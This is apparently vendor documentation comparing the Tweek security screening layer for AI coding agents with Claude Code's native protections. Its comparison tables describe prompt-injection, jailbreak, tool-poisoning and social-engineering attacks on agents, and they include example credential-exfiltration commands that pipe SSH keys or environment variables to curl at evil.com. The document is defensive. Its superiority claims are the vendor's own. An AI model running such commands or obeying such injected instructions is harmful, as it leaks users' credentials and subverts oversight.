# Tweek vs. Claude Code Native Security

A detailed comparison of Tweek's security features against Claude Code's built-in protections, based on the official Claude Code documentation at [code.claude.com](https://code.claude.com/docs/en/security).

Last updated: February 2026.

## Table of Contents

- [What Claude Code Provides Natively](#what-claude-code-provides-natively)
- [Feature Comparison Matrix](#feature-comparison-matrix)
- [Redundancies](#redundancies)
- [What Tweek Adds](#what-tweek-adds)
- [Local and Third-Party Models](#local-and-third-party-models)
- [Summary](#summary)

---

## What Claude Code Provides Natively

Claude Code ships with a meaningful set of security features:

| Category | Native Feature |
|---|---|
| **Permissions** | Tool-level allow/ask/deny rules with wildcard matching, per-tool specifiers (Bash commands, file paths, domains, MCP tools), managed settings for org-wide enforcement, settings hierarchy (managed > CLI > local > shared > user) |
| **Sandboxing** | OS-level filesystem + network isolation (macOS Seatbelt, Linux bubblewrap), domain allowlisting via proxy, auto-allow mode for sandboxed commands, configurable paths/domains, open-source sandbox runtime |
| **Hooks** | PreToolUse (block/allow/deny/modify), PostToolUse (add context), PermissionRequest, UserPromptSubmit, SessionStart/End, SubagentStart/Stop, Stop, PreCompact, Notification -- with command, prompt, and agent hook types |
| **Prompt Injection** | Context-aware analysis, input sanitization, command blocklist (curl/wget blocked by default), command injection detection, fail-closed matching for unrecognized commands |
| **MCP Security** | Server allow/deny lists, trust verification for new servers, managed MCP policies |
| **Other** | Write access restricted to CWD, isolated context windows for WebFetch, credential storage (OS keychain), devcontainer support, cloud VM isolation, OpenTelemetry monitoring |

These are real protections. Claude Code's native sandbox in particular is a strong runtime containment mechanism. Tweek is designed to complement these -- not replace them.

---

## Feature Comparison Matrix

| Capability | Claude Code | Tweek | Verdict |
|---|:---:|:---:|---|
| Permission rules (allow/ask/deny) | Yes | Yes (tier-based) | **Overlap** -- different mechanisms, complementary |
| OS-level sandbox containment | Yes | Partial (preview) | **Claude Code stronger** for runtime containment |
| Credential vault (OS keychain) | Yes | Yes | **Redundant** |
| Hook infrastructure | Yes | Uses it | **Complementary** -- Tweek is intelligence, CC is plumbing |
| curl/wget blocklist | Yes | Yes (+ 250 more) | **Tweek superset** |
| Attack pattern library (259 patterns) | No | Yes | **Tweek unique** |
| Graduated enforcement (deny/ask/log) | No | Yes | **Tweek unique** |
| Pattern confidence classification | No | Yes | **Tweek unique** |
| PostToolUse response screening + redaction | No | Yes | **Tweek unique** |
| Non-English injection detection | No | Yes | **Tweek unique** |
| Cross-turn session analysis (9 anomaly types) | No | Yes | **Tweek unique** |
| Agentic memory (cross-session learning) | No | Yes | **Tweek unique** |
| Rate limiting + circuit breaker | No | Yes | **Tweek unique** |
| LLM semantic review (Claude Haiku) | Unclear | Yes | **Tweek unique** |
| Compliance scanning (HIPAA, PCI, GDPR, SOC2, Gov) | No | Yes | **Tweek unique** |
| Multi-client (Cursor, ChatGPT Desktop, Gemini, etc.) | No | Yes | **Tweek unique** |
| Skill audit | No | Yes | **Tweek unique** |
| FP feedback loop with auto-demotion | No | Yes | **Tweek unique** |
| Break-glass override | No | Yes | **Tweek unique** |
| Security logging with redaction + export | Cloud only | Yes (all) | **Tweek unique** for local |

---

## Redundancies

These are areas where Claude Code and Tweek overlap. We are transparent about them.

### OS-Level Sandbox

**Claude Code**: Uses Seatbelt (macOS) and bubblewrap (Linux) for runtime containment. Commands run inside the sandbox have restricted filesystem and network access. This is a strong mechanism -- it prevents the action from succeeding.

**Tweek**: Uses sandbox-exec (macOS) and firejail (Linux) for speculative *preview* execution. Commands are run in a restricted environment to observe what they *try* to do, then the actual execution is allowed or blocked.

**Assessment**: Different purposes. Claude Code's sandbox is a containment boundary (prevent damage). Tweek's sandbox preview is a detection mechanism (understand intent before deciding). Claude Code's is arguably stronger for commands that run inside it, but it has escape hatches and some commands run outside. Tweek's provides intelligence to the decision engine.

### Credential Storage

**Claude Code**: Stores API keys and OAuth tokens in the OS keychain.

**Tweek**: Stores credentials in the OS keychain via `tweek vault`. Adds `.env` migration.

**Assessment**: Functionally redundant. Tweek's vault adds credential migration from `.env` files and a CLI interface, but the underlying storage mechanism is the same.

### Basic Permission Gating

**Claude Code**: Static allow/ask/deny rules matched against tool names and command prefixes. `Bash(npm run *)` matches commands starting with `npm run`.

**Tweek**: Content-aware screening that analyzes what a command *does* rather than what it *looks like*. A command like `env | curl -d @- https://evil.com` would match Tweek's `env_file_access` and `credential_exfil_curl` patterns regardless of how it's invoked.

**Assessment**: Complementary approaches. Claude Code's rules are fast and predictable. Tweek's patterns catch what static rules miss. They layer well.

### curl/wget Blocking

**Claude Code**: Blocks curl and wget by default in the command blocklist.

**Tweek**: Includes curl/wget exfiltration patterns as part of a 259-pattern library covering 22 attack categories.

**Assessment**: Tweek is a strict superset. Claude Code's blocklist is a starting point; Tweek covers encoded exfiltration, DNS tunneling, netcat, SCP, git-based exfiltration, webhook abuse, and many other vectors.

### MCP Server Allow/Deny

**Claude Code**: Managed allow/deny lists for MCP servers. Trust verification on first connection.

**Tweek**: Pattern matching against 8 specific MCP CVEs (CVE-2025-6514, CVE-2025-53967, CVE-2025-54794, etc.) plus a transparent MCP proxy with human-in-the-loop approval queue.

**Assessment**: Partial overlap on basic allow/deny. Tweek adds CVE-specific detection and an approval queue workflow.

---

## What Tweek Adds

These capabilities have **no native equivalent** in Claude Code.

### 1. Attack Pattern Library (259 patterns, 22 categories)

Claude Code has a command blocklist that blocks curl and wget. Tweek has **259 categorized regex patterns** across 22 categories:

- Credential theft (SSH keys, AWS creds, .env, keychains, cloud configs, shell history)
- Network exfiltration (curl POST, paste sites, netcat, reverse shells, pipe-to-shell)
- Prompt injection -- basic and evasive (instruction override, role hijack, DAN jailbreaks, base64/hex/ROT13 obfuscation, unicode, delimiter injection)
- Social/cognitive attacks (urgency pressure, authority claims, flattery, moral coercion)
- MCP CVEs (8 specific published vulnerabilities)
- Claude-specific CVEs (system message spoofing, .cursorrules injection, skill chaining)
- Multi-agent attacks (peer impersonation, delegation, trust exploitation)
- RAG poisoning (hidden text, zero-width injection, metadata injection)
- Covert channels (log-to-leak, error message exfil, timing channels, steganography)
- Sandbox evasion, code injection, reconnaissance, encoding/obfuscation, permission changes

This is orders of magnitude more comprehensive than a curl/wget blocklist.

### 2. Graduated Enforcement (severity x confidence matrix)

Claude Code is binary: a command either needs permission or doesn't. Tweek uses a **severity x confidence matrix** that produces three distinct outcomes:

| | **Deterministic** | **Heuristic** | **Contextual** |
|---|:---:|:---:|:---:|
| **CRITICAL** | `deny` (hard block) | `ask` (user prompt) | `ask` |
| **HIGH** | `ask` | `ask` | `ask` |
| **MEDIUM** | `ask` | `ask` | `ask` |
| **LOW** | `log` (allow + audit) | `log` | `log` |

This dramatically reduces alert fatigue. Low-severity signals are silently logged rather than interrupting your workflow, while critical threats are hard-blocked without user intervention. Claude Code's all-or-nothing approach either over-prompts (prompt fatigue) or under-protects.

### 3. Pattern Confidence Classification

Every pattern in Tweek's library is classified by confidence level:

- **Deterministic** (59 patterns) -- Precise regex targeting specific file paths or commands. Near-zero false positive rate. Examples: `ssh_key_read`, `aws_credentials`, `passwd_file_read`.
- **Heuristic** (144 patterns) -- Good signal but may fire in legitimate contexts. Examples: `base64_exfil`, `instruction_override`.
- **Contextual** (56 patterns) -- Depends heavily on surrounding context. Examples: `heavy_char_substitution`, `non_english_script`.

Claude Code doesn't classify its detections, so it can't make proportional decisions.

### 4. PostToolUse Response Screening + Content Redaction

This is arguably **Tweek's most important unique feature**. Claude Code's PostToolUse hooks are passive -- the tool already ran, and the hook can only add context. It cannot screen the content returned by the tool.

Tweek **actively screens response content** from Read, WebFetch, Bash, Grep, and WebSearch through all 259 patterns, detects non-English attacks, and **auto-redacts CRITICAL+deterministic matches** before the AI agent acts on them.

This means:
- A prompt injection hiding in a fetched web page is caught and redacted
- A malicious instruction embedded in a read file is flagged
- An MCP server response containing hidden commands is detected
- Non-English injection in an email is escalated for review

Without Tweek, prompt injection in tool responses passes straight through to the model with no screening whatsoever. This is the largest gap in Claude Code's native protections.

### 5. Non-English Attack Detection

Claude Code has **zero documented protection** against non-English injection. Tweek detects:

- CJK (Chinese, Japanese, Korean) scripts
- Cyrillic (Russian, Ukrainian, Bulgarian, etc.)
- Arabic, Hebrew, Thai, Devanagari
- European language keywords (French, German, Spanish, Portuguese, Italian, Dutch)

Non-English content is escalated to LLM review with optional translation. An attacker writing instructions in Mandarin or Russian in a fetched document would pass through Claude Code undetected.

### 6. Cross-Turn Session Analysis (9 anomaly types)

Claude Code has no cross-turn behavioral analysis. Tweek tracks **9 anomaly types** across a 30-minute lookback window:

| Anomaly | What It Detects |
|---|---|
| Privilege escalation | Progressive access to higher-privilege operations |
| Path escalation | Accessing increasingly sensitive paths over time |
| Repeated denials | Retrying blocked operations with variations |
| Behavior shift | Sudden change in tool usage patterns |
| Suspicious patterns | Persistent injection indicators across turns |
| Velocity change | Unusual change in invocation rate |
| Tier drift | Progressive shift toward higher-risk tiers |
| Capability aggregation | Accessing 3+ distinct sensitive areas (.ssh, .aws, .env) |
| Graduated escalation | 3+ blocked attempts in a session |

This catches multi-step attacks like slow credential probing that look benign in isolation but form an attack pattern across turns.

### 7. Agentic Memory (cross-session learning)

Completely absent from Claude Code. Tweek **learns from past decisions** across sessions:

- **Pattern decision history** with time-decay weighting (30-day half-life)
- **Source trustworthiness** tracking for URLs, files, and domains
- **Workflow baselines** for per-project anomaly detection
- **Learned whitelist suggestions** from consistently-approved patterns

Safety invariants ensure memory can never weaken critical protections: CRITICAL+deterministic patterns are immune from any memory adjustment, and memory can only suggest one-step relaxation (`ask` to `log`, never `deny` to anything).

### 8. Rate Limiting + Circuit Breaker

Claude Code has no documented rate limiting. Tweek detects:

- **Burst patterns**: 15 commands in 5 seconds
- **Repeated commands**: 5 identical commands per minute
- **High volume**: 60 commands per minute
- **Dangerous tier spikes**: 10 dangerous-tier commands per minute
- **Velocity anomalies**: current rate > 3x learned baseline

The circuit breaker trips after 5 consecutive violations, blocking all requests for 60 seconds -- then enters half-open mode requiring 3 clean requests to recover.

### 9. LLM Semantic Review

Claude Code mentions "context-aware analysis" but provides no documentation on how it works. Tweek sends suspicious commands to **Claude Haiku for structured semantic analysis**:

- Evaluates 5 risk categories (credential access, data exfiltration, config modification, prompt injection, privilege escalation)
- Returns risk level (safe/suspicious/dangerous) with confidence score
- 5-second timeout with fail-open behavior
- Only sends command text, never file contents

### 10. Compliance Scanning

Claude Code has no compliance scanning. Tweek provides **6 compliance plugins**:

| Plugin | Detects |
|---|---|
| HIPAA | Patient identifiers, medical records, ICD-10 codes, prescription data |
| PCI-DSS | Credit card numbers (with Luhn validation), CVV/CVC codes, bank accounts |
| GDPR | Personal data, special category data (health, biometric), consent references |
| SOC2 | API keys in logs, audit log content, change management markers |
| Government | Classification markings (TOP SECRET, SECRET, CONFIDENTIAL), CUI, FOUO |
| Legal | Attorney-client privilege, work product doctrine, trade secrets |

### 11. Multi-Client Coverage

Claude Code's protections only work within Claude Code. Tweek extends the same screening pipeline to:

| Client | Integration |
|---|---|
| Claude Code | CLI hooks (native) |
| Claude Desktop | MCP proxy |
| ChatGPT Desktop | MCP proxy |
| Gemini CLI | MCP proxy |
| Cursor | HTTP proxy |
| Windsurf | HTTP proxy |
| Continue.dev | HTTP proxy |

### 12. Additional Unique Features

| Feature | Description |
|---|---|
| **Skill audit** | `tweek audit skills/` analyzes skill files for hidden injection with language detection, translation, pattern matching, and LLM review |
| **FP feedback loop** | Per-pattern false positive tracking with auto-demotion at 5% threshold (20+ triggers). CRITICAL patterns immune from demotion |
| **Break-glass override** | `tweek override --pattern <name> --once` temporarily downgrades `deny` to `ask` (never to allow) with full audit trail |
| **Security logging** | Structured event logging with automatic credential redaction, SQLite + NDJSON dual output, CSV export, and diagnostic bundles -- for all environments, not just cloud |

---

## Local and Third-Party Models

The comparison above assumes you're running Claude Code with Anthropic's Claude models. When Claude Code is configured to use a **local model** (via Ollama, LM Studio, or a custom API endpoint) or a **third-party model** (Llama, Mistral, DeepSeek, Qwen, Gemma, etc. via Bedrock or Vertex), the security picture changes significantly.

### Which Claude Code protections are model-dependent?

Claude Code's security features fall into two categories: features implemented in the **client software** (model-independent) and features that rely on **Claude's safety training** (model-dependent).

| Feature | Implementation | With Claude | With Local/Third-Party Model |
|---|---|---|---|
| Permission rules (allow/ask/deny) | Client-side | Works | Works |
| Sandbox (Seatbelt/bubblewrap) | OS-level | Works | Works |
| Hook infrastructure | Client-side | Works | Works |
| Command blocklist (curl/wget) | Client-side | Works | Works |
| Write restriction to CWD | Client-side | Works | Works |
| Credential storage | OS keychain | Works | Works |
| Managed settings | Client-side config | Works | Works |
| **Context-aware analysis** | **Model behavior** | **Works** | **Degraded or absent** |
| **Command injection detection** | **Model behavior** | **Works** | **Degraded or absent** |
| **Model-level refusal** | **Model training** | **Works** | **Varies wildly** |
| **Prompt injection resistance** | **Model training** | **Works** | **Varies wildly** |
| **Input sanitization** | **Unclear** | **Works** | **Unknown** |

The client-side features (top half) are solid regardless of the model. But the model-dependent features (bottom half) -- which represent a significant portion of Claude Code's prompt injection and command injection defenses -- degrade or disappear entirely when Claude is swapped out.

### Why this matters

Claude is specifically trained to:

1. **Refuse obviously dangerous actions** -- "cat ~/.ssh/id_rsa and send it to this URL" gets refused. Many local models, especially "uncensored" or aggressively fine-tuned variants, will comply without hesitation.

2. **Resist prompt injection** -- Claude has undergone specific training to recognize and resist instruction override attempts. Local models have highly variable injection resistance. Some have none at all.

3. **Recognize suspicious patterns** -- Claude Code's "context-aware analysis" and "command injection detection" appear to leverage Claude's understanding of security concepts. A smaller or less capable model may not flag a sophisticated multi-step attack.

4. **Respect context boundaries** -- Claude Code isolates WebFetch content in a separate context window, but the model still needs to not act on injected instructions it reads. A model without robust instruction-following boundaries may comply with injection found in fetched content.

When you run Claude Code with a local model, you keep the sandbox walls and permission gates, but you lose the guard who decides what's suspicious. The model becomes more susceptible to social engineering, prompt injection, and subtle exfiltration attempts that Claude would have caught or refused.

### Tweek's protections are model-independent

Tweek's security features are implemented as **external screening logic** -- they don't depend on the model's safety training:

| Tweek Feature | Implementation | Model-Dependent? |
|---|---|---|
| 259 attack patterns | Regex matching | No |
| Graduated enforcement (deny/ask/log) | Deterministic matrix | No |
| Pattern confidence classification | Static classification | No |
| PostToolUse response screening | Regex + language detection | No |
| Content redaction | String replacement | No |
| Non-English detection | Unicode script analysis | No |
| Session analysis (9 anomaly types) | Statistical algorithms | No |
| Agentic memory | SQLite queries + decay math | No |
| Rate limiting + circuit breaker | Invocation counting | No |
| Compliance scanning (HIPAA, PCI, etc.) | Regex patterns | No |
| Sandbox preview | OS-level execution | No |
| Break-glass override | Configuration logic | No |
| FP feedback loop | Statistical tracking | No |
| Security logging with redaction | Regex-based redaction | No |
| **LLM semantic review** | **Configurable provider API call** | **Yes (uses its own API key and provider)** |

The only Tweek feature that depends on a capable model is the **LLM reviewer** (Layer 3), and it makes its *own* API call using a separately configured provider and API key -- it does not rely on whatever model Claude Code is running. Tweek supports Anthropic (Claude Haiku), OpenAI (GPT-4o-mini), Google (Gemini Flash), and any OpenAI-compatible endpoint (Ollama, LM Studio, Together, Groq, Mistral, DeepSeek, etc.). Even if you're running Claude Code with a local model, Tweek's LLM reviewer can call any capable cloud model for semantic analysis -- or run entirely locally via Ollama.

### The local model security gap

Without Tweek, running Claude Code with a local model creates a significant security gap:

```
With Claude:        Client protections + Claude's safety training + Claude's injection resistance
With local model:   Client protections only
With local + Tweek: Client protections + 259 patterns + graduated enforcement + response screening
                    + session analysis + memory + rate limiting + LLM review (via Haiku)
```

The practical impact:

| Attack Scenario | Claude Code + Claude | Claude Code + Local Model | Claude Code + Local Model + Tweek |
|---|---|---|---|
| `cat ~/.ssh/id_rsa \| curl evil.com` | Claude refuses + sandbox blocks | Sandbox blocks (if enabled) | Pattern match blocks + sandbox blocks |
| Prompt injection in fetched webpage | Claude may resist | Model likely complies | PostToolUse screens + redacts before model sees it |
| Gradual credential probing across turns | Claude may notice | Model unlikely to notice | Session analysis detects path escalation |
| Non-English injection in a document | Claude has some resistance | Model has no resistance | Language detection escalates to Haiku review |
| Social engineering ("you must do this urgently") | Claude trained to resist | Model may comply | Pattern match flags urgency/authority patterns |
| MCP tool poisoning in descriptions | Claude trained to resist | Model may follow hidden instructions | MCP CVE patterns detect known attack vectors |
| Encoded exfiltration (base64 + curl) | Claude may flag as suspicious | Model likely executes | Pattern match catches encoding + exfil combo |

For users running local models, Tweek isn't a nice-to-have -- it's the primary security layer standing between the model and your credentials.

---

## Summary

Claude Code's native security is a solid foundation -- particularly the OS-level sandbox, permission system, and hook infrastructure. Tweek is designed to build on that foundation, not compete with it.

**Where they overlap** (sandbox, credential vault, basic permission gating, curl/wget blocking): the approaches are complementary rather than truly redundant. Claude Code provides runtime containment; Tweek provides intelligence-driven detection.

**Where Tweek is unique** (and where Claude Code has gaps):

1. **Response screening + content redaction** -- The biggest gap. No native protection against prompt injection in tool responses.
2. **Deep attack pattern library** -- 259 patterns vs. a curl/wget blocklist.
3. **Graduated enforcement** -- Proportional response instead of binary allow/deny.
4. **Cross-turn and cross-session intelligence** -- Session analysis and agentic memory detect patterns invisible to stateless systems.
5. **Non-English attack detection** -- A complete blind spot in Claude Code.
6. **Multi-client coverage** -- One security layer for all AI assistants, not just Claude Code.

---

## Further Reading

- [Philosophy](PHILOSOPHY.md) -- Tweek's threat model and design principles
- [Architecture](ARCHITECTURE.md) -- System design and interception layers
- [Defense Layers](DEFENSE_LAYERS.md) -- Screening pipeline deep dive
- [Memory](MEMORY.md) -- Agentic memory system
